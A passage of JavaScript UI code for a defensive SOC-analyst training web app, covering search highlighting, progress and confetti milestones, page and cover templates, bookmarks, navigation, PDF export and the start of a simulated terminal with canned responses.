  } else {
    progressContainer.style.display = "none";
  }
}

function applySearchHighlights() {
  const searchInput = document.getElementById("search-input");
  const query = searchInput ? searchInput.value.trim().toLowerCase() : "";
  if (!query || query.length < 2) return;

  const container = document.getElementById("notebook-paper-view");
  if (!container) return;

  const targetSelectors = "p, .handwritten-text, h2, .syntax-box, .cmd-box, .qa-ideal-box, .flashcard-question-title";
  const elements = container.querySelectorAll(targetSelectors);

  elements.forEach(el => {
    if (el.querySelector("mark.highlight")) return;

    const walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT, null, false);
    const textNodes = [];
    let node;
    while ((node = walker.nextNode())) {
      if (node.nodeValue.toLowerCase().includes(query)) {
        textNodes.push(node);
      }
    }

    textNodes.forEach(textNode => {
      const parent = textNode.parentNode;
      if (parent.tagName === "MARK" || parent.tagName === "SCRIPT" || parent.tagName === "STYLE") return;

      const text = textNode.nodeValue;
      const regex = new RegExp(`(${query.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")})`, "gi");
      const frag = document.createDocumentFragment();
      let lastIdx = 0;
      let match;

      while ((match = regex.exec(text)) !== null) {
        if (match.index > lastIdx) {
          frag.appendChild(document.createTextNode(text.substring(lastIdx, match.index)));
        }
        const mark = document.createElement("mark");
        mark.className = "highlight";
        mark.textContent = match[0];
        frag.appendChild(mark);
        lastIdx = regex.lastIndex;
      }

      if (lastIdx < text.length) {
        frag.appendChild(document.createTextNode(text.substring(lastIdx)));
      }

      parent.replaceChild(frag, textNode);
    });
  });
}

// --- TERMINAL COLOR SCHEMES & CONFETTI MILESTONE SYSTEM ---
function applyTerminalColorScheme(scheme) {
  const termWin = document.querySelector(".terminal-window");
  if (termWin) {
    termWin.setAttribute("data-term-theme", scheme || "light");
  }
}

let celebratedMilestones = JSON.parse(localStorage.getItem("soc_celebrated_milestones") || "[]");

function togglePageCompletion(mode, id) {
  let list = completedPages;
  let storageKey = "soc_completed_pages";
  if (mode === "interview") {
    list = completedQAs;
    storageKey = "soc_completed_qas";
  } else if (mode === "advanced") {
    list = completedAdvancedPages;
    storageKey = "advanced_completed_pages";
  }

  const idx = list.indexOf(id);
  let nowCompleted = false;

  if (idx > -1) {
    list.splice(idx, 1);
  } else {
    list.push(id);
    nowCompleted = true;
  }

  localStorage.setItem(storageKey, JSON.stringify(list));

  // Update button visual state
  const btns = document.querySelectorAll(".btn-mark-complete");
  btns.forEach(btn => {
    if (nowCompleted) {
      btn.classList.add("completed");
      btn.innerHTML = "✓ Completed";
    } else {
      btn.classList.remove("completed");
      btn.innerHTML = "☑️ Mark as Complete";
    }
  });

  // Re-render sidebar to show completion checks
  initSidebar();
  updateReadingProgress();

  if (nowCompleted) {
    checkModuleCompletionOnMark(mode, id);
  }
}

function checkModuleCompletionOnMark(mode, id) {
  if (mode === "notebook") {
    const page = typeof NOTEBOOK_PAGES !== "undefined" ? NOTEBOOK_PAGES.find(p => p.id === id) : null;
    if (!page) return;
    const modId = page.moduleId;
    const modPages = NOTEBOOK_PAGES.filter(p => p.moduleId === modId);
    const lastPageInMod = modPages[modPages.length - 1].id;
    
    // Celebration triggers ONLY when ALL pages of the module are completed!
    const isModuleFinished = modPages.every(p => completedPages.includes(p.id));

    if (isModuleFinished) {
      const milestoneKey = `mod_${modId}`;
      if (!celebratedMilestones.includes(milestoneKey)) {
        celebratedMilestones.push(milestoneKey);
        localStorage.setItem("soc_celebrated_milestones", JSON.stringify(celebratedMilestones));

        const modObj = typeof NOTEBOOK_MODULES !== "undefined" ? NOTEBOOK_MODULES.find(m => m.id === modId) : null;
        const modTitle = modObj ? modObj.title : `Module ${modId}`;
        
        let title = `🎉 ${modTitle.toUpperCase()} COMPLETED! EXCELLENT PROGRESS!`;
        if (id === 365 || modId === 11) {
          title = "🏆 365-DAY MASTER MILESTONE COMPLETED! CERTIFIED BLUE TEAM ANALYST!";
        }
        triggerConfetti(title);
      }
    }
  } else if (mode === "interview") {
    const qa = typeof INTERVIEW_QUESTIONS !== "undefined" ? INTERVIEW_QUESTIONS.find(q => q.id === id) : null;
    if (!qa) return;
    const catId = qa.catId;
    const catQAs = INTERVIEW_QUESTIONS.filter(q => q.catId === catId);

    // Celebration triggers ONLY when ALL questions of the category are completed!
    const isCatFinished = catQAs.every(q => completedQAs.includes(q.id));

    if (isCatFinished) {
      const milestoneKey = `interview_cat_${catId}`;
      if (!celebratedMilestones.includes(milestoneKey)) {
        celebratedMilestones.push(milestoneKey);
        localStorage.setItem("soc_celebrated_milestones", JSON.stringify(celebratedMilestones));

        const catObj = typeof INTERVIEW_CATEGORIES !== "undefined" ? INTERVIEW_CATEGORIES.find(c => c.id === catId) : null;
        const catTitle = catObj ? catObj.title : `Module ${catId}`;

        let title = `🎉 ${catTitle.toUpperCase()} COMPLETED! EXCELLENT WORK!`;
        if (id === 214 || catId === 5) {
          title = "🎯 ALL 200+ INTERVIEW QUESTIONS MASTERED! YOU ARE INTERVIEW READY!";
        }
        triggerConfetti(title);
      }
    }
  }
}

function triggerConfetti(bannerTitle) {
  // 1. Toast / Banner notification
  let banner = document.getElementById("milestone-toast-banner");
  if (!banner) {
    banner = document.createElement("div");
    banner.id = "milestone-toast-banner";
    banner.className = "milestone-toast-banner";
    document.body.appendChild(banner);
  }
  banner.innerHTML = `
    <div class="milestone-toast-content">
      <span class="milestone-toast-icon">✨</span>
      <span>${bannerTitle}</span>
    </div>
  `;
  banner.classList.add("show");
  setTimeout(() => banner.classList.remove("show"), 5000);

  // 2. Canvas Confetti Particles Animation
  let canvas = document.getElementById("confetti-canvas");
  if (!canvas) {
    canvas = document.createElement("canvas");
    canvas.id = "confetti-canvas";
    canvas.style.cssText = "position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:99999;";
    document.body.appendChild(canvas);
  }

  const ctx = canvas.getContext("2d");
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const colors = ["#1565c0", "#0284c7", "#ff5964", "#ffe600", "#4ade80", "#a855f7", "#ec4899", "#38bdf8"];
  const particles = [];
  const count = 120;

  for (let i = 0; i < count; i++) {
    particles.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height * 0.4 - canvas.height * 0.2,
      r: Math.random() * 8 + 4,
      d: Math.random() * count,
      color: colors[Math.floor(Math.random() * colors.length)],
      tilt: Math.floor(Math.random() * 10) - 10,
      tiltAngleIncremental: Math.random() * 0.07 + 0.03,
      tiltAngle: Math.random() * Math.PI,
      vy: Math.random() * 3 + 2,
      vx: (Math.random() - 0.5) * 3
    });
  }

  let startTime = Date.now();
  function draw() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    particles.forEach(p => {
      p.tiltAngle += p.tiltAngleIncremental;
      p.y += p.vy;
      p.x += p.vx + Math.sin(p.d);
      p.tilt = Math.sin(p.tiltAngle) * 15;

      ctx.beginPath();
      ctx.lineWidth = p.r / 2;
      ctx.strokeStyle = p.color;
      ctx.moveTo(p.x + p.tilt + p.r / 4, p.y);
      ctx.lineTo(p.x + p.tilt, p.y + p.tilt + p.r / 4);
      ctx.stroke();
    });

    if (Date.now() - startTime < 4200) {
      requestAnimationFrame(draw);
    } else {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
    }
  }

  draw();
}

// --- GENERATE BRAND COVER PAGE HTML ---

function generateAdvancedPageHTML(page) {
  const isFirstPage = page.id === 1;
  const isLastPage = page.id === (window.ADVANCED_DOMAIN_PAGES ? window.ADVANCED_DOMAIN_PAGES.length : 456);
  const modObj = window.ADVANCED_DOMAIN_MODULES ? window.ADVANCED_DOMAIN_MODULES.find(m => m.id === page.moduleId) : null;
  const moduleTitle = modObj ? modObj.title : `Module ${page.moduleId}`;

  return `
    <article class="ruled-paper advanced-notebook-page">
      <img src="logo.png" alt="ADVANCED SOC ANALYST HANDBOOK" class="brand-watermark-stamp" />

      ${isFirstPage ? `
        <div style="background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(59, 130, 246, 0.15)); border: 2px solid var(--accent-blue); padding: 1.5rem; border-radius: 12px; margin-bottom: 1.5rem; text-align: center;">
          <img src="logo.png" style="width: 80px; height: 80px; margin-bottom: 0.5rem;" />
          <h1 style="font-family: 'Outfit', sans-serif; color: var(--accent-blue); font-size: 1.8rem; margin: 0;">🛡️ ADVANCED SOC ANALYST HANDBOOK</h1>
          <p style="font-weight: 700; color: var(--text-ink); margin-top: 0.4rem;">400+ PAGE MASTER HANDBOOK — TELUGU-ENGLISH + TECHNICAL ENGLISH</p>
          <div style="display: flex; justify-content: center; gap: 0.8rem; margin-top: 0.8rem; font-size: 0.85rem; flex-wrap: wrap;">
            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">🛡️ 400+ Advanced Pages</span>
            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">🔴 Endpoint, SIEM, DFIR & Cloud</span>
            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">⚡ Practical SOC Ready</span>
          </div>
        </div>
      ` : ''}

      ${isLastPage ? `
        <div style="background: linear-gradient(135deg, rgba(234, 179, 8, 0.18), rgba(34, 197, 94, 0.18)); border: 2px solid #eab308; padding: 1.5rem; border-radius: 12px; margin-bottom: 1.5rem; text-align: center;">
          <div style="font-size: 3rem; margin-bottom: 0.2rem;">🏆 🎓 🛡️</div>
          <h1 style="font-family: 'Outfit', sans-serif; color: #eab308; font-size: 2rem; margin: 0;">ADVANCED SOC MASTER CERTIFICATION</h1>
          <p style="font-weight: 700; color: var(--text-ink); margin-top: 0.4rem;">CONGRATULATIONS! YOU HAVE COMPLETED ALL 400+ ADVANCED SOC ANALYST PAGES!</p>
        </div>
      ` : ''}

      <header class="page-header-row">
        <div class="concept-title-box">
          <h2>${escapeHTML(page.concept)}</h2>
          <span class="concept-tag">${escapeHTML(moduleTitle)}</span>
        </div>
        <div class="page-stamp">ADVANCED PAGE ${page.id}</div>
      </header>

      ${page.explanation ? `
        <div class="section-block">
          <div class="section-label">💡 SIMPLE EXPLANATION (TELUGU-ENGLISH)</div>
          <p class="handwritten-text">"${escapeHTML(page.explanation)}"</p>
        </div>
      ` : ''}

      ${page.whyItMatters ? `
        <div class="section-block">
          <div class="section-label">⚡ WHY IT MATTERS (SOC PERSPECTIVE)</div>
          <p class="handwritten-text">"${escapeHTML(page.whyItMatters)}"</p>
        </div>
      ` : ''}

      ${page.technicalConcept ? `
        <div class="section-block">
          <div class="section-label">🧠 TECHNICAL CONCEPT & MECHANISM</div>
          <div class="technical-concept-box" style="background:var(--bg-app); border:1px solid var(--card-border); padding:1rem; border-radius:8px; font-size:0.92rem; color:var(--text-ink);">
            ${escapeHTML(page.technicalConcept)}
          </div>
        </div>
      ` : ''}

      ${page.command ? `
        <div class="section-block">
          <div class="section-label">💻 COMMAND / QUERY / SYNTAX</div>
          ${page.syntax ? `<div class="syntax-box">SYNTAX: ${escapeHTML(page.syntax)}</div>` : ''}
          <div class="cmd-box">$ ${escapeHTML(page.command)}</div>
        </div>
      ` : ''}

      ${page.example ? `
        <div class="section-block">
          <div class="section-label">🖥️ TERMINAL / LOG / PCAP EXAMPLE</div>
          <div class="cmd-box">${escapeHTML(page.example)}</div>
          ${page.cmdExplanation ? `<p class="handwritten-text" style="margin-top:0.5rem;">"${escapeHTML(page.cmdExplanation)}"</p>` : ''}
        </div>
      ` : ''}

      ${page.investigation ? `
        <div class="section-block">
          <div class="section-label">🔎 SOC INVESTIGATION WORKFLOW</div>
          <div class="investigation-flow-box" style="background:rgba(56, 189, 248, 0.1); border:1px dashed var(--accent-blue); padding:0.8rem 1.2rem; border-radius:8px; font-weight:700; color:var(--accent-blue); font-size:0.9rem;">
            ${escapeHTML(page.investigation)}
          </div>
        </div>
      ` : ''}

      ${page.detection ? `
        <div class="section-block">
          <div class="section-label">🛡️ DETECTION / DEFENSIVE VIEW</div>
          <p class="handwritten-text">"${escapeHTML(page.detection)}"</p>
        </div>
      ` : ''}

      ${page.mitre ? `
        <div class="section-block">
          <div class="section-label">🧩 MITRE ATT&CK FRAMEWORK MAPPING</div>
          <div style="background:rgba(168, 85, 247, 0.1); border:1px solid #8b5cf6; padding:0.6rem 1rem; border-radius:8px; font-weight:700; color:#8b5cf6; font-size:0.88rem;">
            🎯 ${escapeHTML(page.mitre)}
          </div>
        </div>
      ` : ''}

      ${page.tryIt ? `
        <div class="sticky-note">
          "🧪 <strong>TRY IT PRACTICAL EXERCISE:</strong> ${escapeHTML(page.tryIt)}"
        </div>
      ` : ''}

      ${page.scenario ? `
        <div class="section-block" style="margin-top:1rem;">
          <div class="section-label">🚨 REAL SOC SCENARIO</div>
          <div style="background:rgba(239, 68, 68, 0.08); border-left:4px solid #ef4444; padding:0.8rem 1rem; border-radius:0 8px 8px 0; font-size:0.9rem; color:var(--text-ink);">
            ${escapeHTML(page.scenario)}
          </div>
        </div>
      ` : ''}

      ${page.proTip ? `
        <div class="pro-tip-box" style="margin-top:1rem;">
          💡 <strong>SOC ANALYST PRO-TIP:</strong> ${escapeHTML(page.proTip)}
        </div>
      ` : ''}

      ${page.commonMistakes ? `
        <div class="section-block" style="margin-top:1rem;">
          <div class="section-label">⚠️ COMMON BEGINNER MISTAKES</div>
          <div style="background:rgba(245, 158, 11, 0.1); border-left:4px solid #f59e0b; padding:0.6rem 1rem; border-radius:0 8px 8px 0; font-size:0.88rem; color:var(--text-ink);">
            ${escapeHTML(page.commonMistakes)}
          </div>
        </div>
      ` : ''}

      ${page.interviewQ ? `
        <div class="section-block" style="margin-top:1rem;">
          <div class="section-label">🎯 INTERVIEW CONNECTION</div>
          <div style="background:rgba(16, 185, 129, 0.08); border-left:4px solid #10b981; padding:0.6rem 1rem; border-radius:0 8px 8px 0; font-size:0.88rem; color:var(--text-ink);">
            <strong>Q:</strong> ${escapeHTML(page.interviewQ)}
          </div>
        </div>
      ` : ''}

      ${page.noteVisual ? `
        <div class="section-block" style="margin-top:1rem;">
          <div class="section-label">✏️ HANDWRITTEN VISUAL DIAGRAM</div>
          <div class="diagram-box" style="white-space:pre-wrap; font-family:'Fira Code', monospace; font-size:0.85rem;">${escapeHTML(page.noteVisual)}</div>
        </div>
      ` : ''}

      ${page.quickRevision ? `
        <div class="section-block" style="margin-top:1rem;">
          <div class="section-label">⚡ QUICK REVISION BULLETS</div>
          <div style="background:var(--bg-app); border:1px solid var(--card-border); padding:0.8rem 1.2rem; border-radius:8px; font-size:0.88rem; white-space:pre-wrap;">${escapeHTML(page.quickRevision)}</div>
        </div>
      ` : ''}

      <div class="page-completion-footer" style="margin-top:1.5rem;">
        <button class="btn-mark-complete ${completedAdvancedPages.includes(page.id) ? 'completed' : ''}" onclick="togglePageCompletion('advanced', ${page.id})">
          ${completedAdvancedPages.includes(page.id) ? '✓ Completed' : '☑️ Mark as Complete'}
        </button>
      </div>
    </article>
  `;
}

function generateBrandCoverHTML() {
  return `
    <article class="brand-cover-page">
      <img src="logo.png" alt="LINUX SOC HANDBOOK" class="cover-logo-hero" />
      <h1 class="cover-title">LINUX SOC HANDBOOK</h1>
      <p class="cover-subtitle">BLUE TEAM READY — 365-PAGE NOTEBOOK & 200+ INTERVIEW Q&A</p>
      
      <div class="cover-badge-row">
        <span class="cover-badge">🐧 Linux Security</span>
        <span class="cover-badge">🔎 Log Forensics</span>
        <span class="cover-badge">🛡️ Incident Response</span>
        <span class="cover-badge">🎯 200+ Interview Q&A</span>
      </div>

      <div class="cover-profile-links" style="display:flex; justify-content:center; gap:0.8rem; margin:1.8rem 0 1rem 0; flex-wrap:wrap;">
        <a href="https://github.com/Samrudh2006" target="_blank" rel="noopener noreferrer" class="profile-pill btn-github" style="padding:0.5rem 1.2rem; font-size:0.95rem;">
          <svg class="profile-icon" viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
          <span>GitHub: @Samrudh2006</span>
        </a>
        <a href="https://www.linkedin.com/in/satyasamrudh" target="_blank" rel="noopener noreferrer" class="profile-pill btn-linkedin" style="padding:0.5rem 1.2rem; font-size:0.95rem;">
          <svg class="profile-icon" viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14m-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.28 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93h2.75M6.46 10.9v8.37H9.25V10.9H6.46M7.86 6.74a1.62 1.62 0 1 0 0 3.24 1.62 1.62 0 0 0 0-3.24z"/></svg>
          <span>LinkedIn: Satya Samrudh</span>
        </a>
        <a href="mailto:samrudhdwivedula12@gmail.com" class="profile-pill btn-email" style="padding:0.5rem 1.2rem; font-size:0.95rem;">
          <svg class="profile-icon" viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
          <span>Mail: samrudhdwivedula12@gmail.com</span>
        </a>
      </div>

      <p style="font-family:var(--font-hand); font-size:1.4rem; color:var(--text-ink); margin-top:1.5rem;">
        "Naaku easy ga ardham avvali → Command ela work chustham → Practical SOC lo apply chestham → Interview lo crack chestham!"
      </p>
    </article>
  `;
}

function getModuleName(modId) {
  const mod = NOTEBOOK_MODULES.find(m => m.id === modId);
  return mod ? mod.title : `Module ${modId}`;
}

function escapeHTML(str) {
  if (!str) return '';
  return str.replace(/[&<>"']/g, function(m) {
    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' }[m];
  });
}

// --- EVENT LISTENERS ---
function setupEventListeners() {
  // Page Switchers
  document.getElementById("btn-prev-page").addEventListener("click", () => {
    if (activeMode === "notebook" && currentPageId > 1) {
      currentPageId--;
      renderCurrentView("prev");
      updateActiveSidebarItem();
    } else if (activeMode === "interview" && currentQAId > 1) {
      currentQAId--;
      renderCurrentView("prev");
      updateActiveSidebarItem();
    }
  });

  document.getElementById("btn-next-page").addEventListener("click", () => {
    if (activeMode === "notebook" && currentPageId < NOTEBOOK_PAGES.length) {
      currentPageId++;
      renderCurrentView("next");
      updateActiveSidebarItem();
    } else if (activeMode === "interview" && currentQAId < INTERVIEW_QUESTIONS.length) {
      currentQAId++;
      renderCurrentView("next");
      updateActiveSidebarItem();
    }
  });

  // Toggle Sidebar Listener
  const toggleBtn = document.getElementById("btn-toggle-sidebar");
  if (toggleBtn) {
    toggleBtn.addEventListener("click", toggleSidebar);
  }

  // Auto Play Slideshow Listener
  const playBtn = document.getElementById("btn-play-slideshow");
  if (playBtn) {
    playBtn.addEventListener("click", toggleAutoPlay);
  }

  // Voice Speech Synthesis Listener
  const listenBtn = document.getElementById("btn-listen-speech");
  if (listenBtn) {
    listenBtn.addEventListener("click", toggleSpeech);
  }

  document.getElementById("page-number-input").addEventListener("change", (e) => {
    const val = parseInt(e.target.value);
    if (activeMode === "notebook") {
      if (val >= 1 && val <= NOTEBOOK_PAGES.length) {
        const dir = val > currentPageId ? "next" : "prev";
        currentPageId = val;
        renderCurrentView(dir);
        updateActiveSidebarItem();
      }
    } else if (activeMode === "interview") {
      if (val >= 1 && val <= INTERVIEW_QUESTIONS.length) {
        const dir = val > currentQAId ? "next" : "prev";
        currentQAId = val;
        renderCurrentView(dir);
        updateActiveSidebarItem();
      }
    }
  });


  document.getElementById("search-input").addEventListener("input", (e) => {
    filterSidebar(e.target.value.toLowerCase().trim());
  });

  document.querySelectorAll(".filter-btn").forEach(btn => {
    btn.addEventListener("click", (e) => {
      document.querySelectorAll(".filter-btn").forEach(b => b.classList.remove("active"));
      e.target.classList.add("active");
      currentFilter = e.target.getAttribute("data-filter");
      filterSidebar(document.getElementById("search-input").value.toLowerCase().trim());
    });
  });

  document.getElementById("btn-bookmark").addEventListener("click", () => {
    if (activeMode === "notebook") {
  toggleBookmark(currentPageId, bookmarkedPages, "soc_bookmarked_pages");
} else if (activeMode === "interview") {
  toggleBookmark(currentQAId, bookmarkedQAs, "soc_bookmarked_qas");
} else if (activeMode === "advanced") {
  toggleBookmark(currentPageId, bookmarkedAdvancedPages, "adv_bookmarked_pages");
}    
    updateBookmarkButtonState(activeMode === "notebook" ? currentPageId : currentQAId);
    initSidebar();
  });

  document.getElementById("btn-theme-toggle").addEventListener("click", () => {
    document.body.classList.toggle("theme-cyber");
  });

  document.getElementById("btn-print-pdf").addEventListener("click", openPdfExportModal);

  document.getElementById("btn-terminal-open").addEventListener("click", () => {
    document.getElementById("terminal-modal").classList.remove("hidden");
    document.getElementById("terminal-input").focus();
  });

  document.getElementById("btn-terminal-close").addEventListener("click", () => {
    document.getElementById("terminal-modal").classList.add("hidden");
  });

  const termThemeSelect = document.getElementById("term-theme-select");
  if (termThemeSelect) {
    const allowedSchemes = ["light", "cyber-dark"];
    const storedScheme = localStorage.getItem("term_color_scheme");
    const savedScheme = allowedSchemes.includes(storedScheme) ? storedScheme : "light";
    termThemeSelect.value = savedScheme;
    applyTerminalColorScheme(savedScheme);
    localStorage.setItem("term_color_scheme", savedScheme);

    termThemeSelect.addEventListener("change", (e) => {
      const scheme = e.target.value;
      localStorage.setItem("term_color_scheme", scheme);
      applyTerminalColorScheme(scheme);
    });
  }

  document.getElementById("terminal-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      handleTerminalCommand(e.target.value);
      e.target.value = "";
    }
  });

  // --- KEYBOARD NAVIGATION (Book Reading Mode) ---
  document.addEventListener("keydown", (e) => {
    const terminalOpen = !document.getElementById("terminal-modal").classList.contains("hidden");
    if (terminalOpen) return; // Don't hijack when terminal is open

    const pageInput = document.getElementById("page-number-input");
    if (document.activeElement === pageInput) return;

    if (e.key === "ArrowRight" || e.key === "PageDown") {
      e.preventDefault();
      if (activeMode === "notebook" && currentPageId < NOTEBOOK_PAGES.length) {
        currentPageId++; renderCurrentView("next"); updateActiveSidebarItem();
      } else if (activeMode === "interview" && currentQAId < INTERVIEW_QUESTIONS.length) {
        currentQAId++; renderCurrentView("next"); updateActiveSidebarItem();
      }
    } else if (e.key === "ArrowLeft" || e.key === "PageUp") {
      e.preventDefault();
      if (activeMode === "notebook" && currentPageId > 1) {
        currentPageId--; renderCurrentView("prev"); updateActiveSidebarItem();
      } else if (activeMode === "interview" && currentQAId > 1) {
        currentQAId--; renderCurrentView("prev"); updateActiveSidebarItem();
      }
    } else if (e.key === " ") {
      e.preventDefault();
      toggleAutoPlay(); // Spacebar toggles auto-play
    } else if (e.key === "b" || e.key === "B") {
      toggleSidebar(); // B key collapses/expands sidebar
    }
  });
}

function toggleBookmark(id, list, storageKey) {
  const index = list.indexOf(id);
  if (index > -1) {
    list.splice(index, 1);
  } else {
    list.push(id);
  }
  localStorage.setItem(storageKey, JSON.stringify(list));
}

function updateBookmarkButtonState(id) {
  const btn = document.getElementById("btn-bookmark");
  let isBookmarked = false;
  if (activeMode === "notebook") {
    isBookmarked = bookmarkedPages.includes(id);
  } else if (activeMode === "interview") {
    isBookmarked = bookmarkedQAs.includes(id);
  } else if (activeMode === "advanced") {
    isBookmarked = bookmarkedAdvancedPages.includes(id);
  }
  if (isBookmarked) {
    btn.classList.add("bookmarked");
    btn.innerText = "⭐ Saved";
  } else {
    btn.classList.remove("bookmarked");
    btn.innerText = "⭐ Save Item";
  }
}

function filterSidebar(query) {
  document.querySelectorAll(".page-item").forEach(item => {
    const pId = parseInt(item.getAttribute("data-item-id"));
    let matchesSearch = false;
    let isBookmarked = false;

    if (activeMode === "notebook") {
      const page = NOTEBOOK_PAGES.find(p => p.id === pId);
      matchesSearch = !query || page.concept.toLowerCase().includes(query) || page.command.toLowerCase().includes(query);
      isBookmarked = bookmarkedPages.includes(pId);
    } else if (activeMode === "interview") {
      const qa = INTERVIEW_QUESTIONS.find(q => q.id === pId);
      matchesSearch = !query || qa.question.toLowerCase().includes(query) || qa.idealAnswer.toLowerCase().includes(query);
      isBookmarked = bookmarkedQAs.includes(pId);
    } else if (activeMode === "advanced") {
      const page = ADVANCED_DOMAIN_PAGES.find(p => p.id === pId);
      matchesSearch = !query || page.concept.toLowerCase().includes(query) || page.command.toLowerCase().includes(query);
      isBookmarked = bookmarkedAdvancedPages.includes(pId);
    }

    const matchesFilter = (currentFilter === "all") || (currentFilter === "bookmarked" && isBookmarked);

    if (matchesSearch && matchesFilter) {
      item.style.display = "flex";
    } else {
      item.style.display = "none";
    }
  });
}

// (renderCurrentView unified above — duplicate removed)

// --- SLIDESHOW AUTO PLAY CONTROLLER ---
let autoPlayInterval = null;

function toggleAutoPlay() {
  const playBtn = document.getElementById("btn-play-slideshow");
  const playBtnText = document.getElementById("play-btn-text");

  if (autoPlayInterval) {
    // Stop Auto Play
    clearInterval(autoPlayInterval);
    autoPlayInterval = null;
    playBtn.classList.remove("playing");
    playBtnText.innerText = "Auto Play (5s)";
  } else {
    // Start Auto Play
    playBtn.classList.add("playing");
    playBtnText.innerText = "⏸️ Pause Play";

    autoPlayInterval = setInterval(() => {
      if (activeMode === "notebook") {
        if (currentPageId < NOTEBOOK_PAGES.length) {
          currentPageId++; renderCurrentView("next"); updateActiveSidebarItem();
        } else { toggleAutoPlay(); } // Stop at last page
      } else if (activeMode === "interview") {
        if (currentQAId < INTERVIEW_QUESTIONS.length) {
          currentQAId++; renderCurrentView("next"); updateActiveSidebarItem();
        } else { toggleAutoPlay(); }
      }
    }, 5000);
  }
}


// --- SIDEBAR TOGGLE CONTROLLER ---
function toggleSidebar() {
  const isMobile = window.innerWidth <= 768;
  const sidebar = document.getElementById("main-sidebar");
  const overlay = document.getElementById("sidebar-overlay");
  const mainContainer = document.querySelector(".main-container");
  const toggleText = document.getElementById("sidebar-toggle-text");

  if (isMobile) {
    // Mobile: slide drawer in/out
    sidebar.classList.toggle("mobile-open");
    overlay.classList.toggle("active");
    document.body.classList.toggle("drawer-open", sidebar.classList.contains("mobile-open"));
  } else {
    // Desktop: collapse sidebar into zero-width
    mainContainer.classList.toggle("sidebar-collapsed");
    const isCollapsed = mainContainer.classList.contains("sidebar-collapsed");
    toggleText.innerText = isCollapsed ? "Show Sidebar" : "Hide Sidebar";
  }
}

function initLayoutMetrics() {
  const applyMetrics = () => {
    const header = document.querySelector(".app-header");
    const modeTabs = document.querySelector(".mode-tabs-bar");
    const mobileNav = document.getElementById("mobile-bottom-nav");
    const stickyTop = (header ? header.offsetHeight : 0) + (modeTabs ? modeTabs.offsetHeight : 0);
    const mobileNavHeight = mobileNav ? mobileNav.offsetHeight : 56;

    document.documentElement.style.setProperty("--sticky-top-offset", `${stickyTop}px`);
    document.documentElement.style.setProperty("--sidebar-height", `calc(100dvh - ${stickyTop}px)`);
    document.documentElement.style.setProperty("--mobile-bottom-nav-space", `${mobileNavHeight + 16}px`);
  };

  const scheduleApply = () => window.requestAnimationFrame(applyMetrics);
  applyMetrics();
  window.addEventListener("resize", scheduleApply);
  window.addEventListener("orientationchange", scheduleApply);
}


function openPdfExportModal() {
  const modal = document.getElementById("pdf-export-choice-modal");
  if (modal) modal.style.display = "flex";
}

function closePdfExportModal() {
  const modal = document.getElementById("pdf-export-choice-modal");
  if (modal) modal.style.display = "none";
}

function exportChosenPDF(type) {
  closePdfExportModal();
  const pdfContainer = document.getElementById("full-pdf-container");
  if (!pdfContainer) return;

  pdfContainer.innerHTML = generateBrandCoverHTML();

  if (type === "notebook") {
    NOTEBOOK_PAGES.forEach(page => {
      pdfContainer.innerHTML += generatePageHTML(page);
    });
  } else if (type === "interview") {
    INTERVIEW_QUESTIONS.forEach(qa => {
      pdfContainer.innerHTML += generateInterviewQAHTML(qa);
    });
  }

  setTimeout(() => {
    window.print();
  }, 350);
}

function handleTerminalCommand(cmdStr) {
  const outputDiv = document.getElementById("terminal-output");
  const trimmed = cmdStr.trim();
  if (trimmed === "") return;

  const line = document.createElement("div");
  line.className = "term-cmd-line";
  line.innerHTML = `<span class="term-prompt">kali@soc-workstation:~$</span> ${escapeHTML(trimmed)}`;
  outputDiv.appendChild(line);

  const res = document.createElement("div");
  res.className = "term-response";
  const lower = trimmed.toLowerCase();

  if (lower === "clear") {
    outputDiv.innerHTML = "";
    return;
  }

  if (lower === "pwd") {
    res.innerText = "/home/analyst";
  } else if (lower === "whoami") {
    res.innerText = "kali";
  } else if (lower === "id") {
    res.innerText = "uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo),100(users)";
  } else if (lower.startsWith("uname")) {
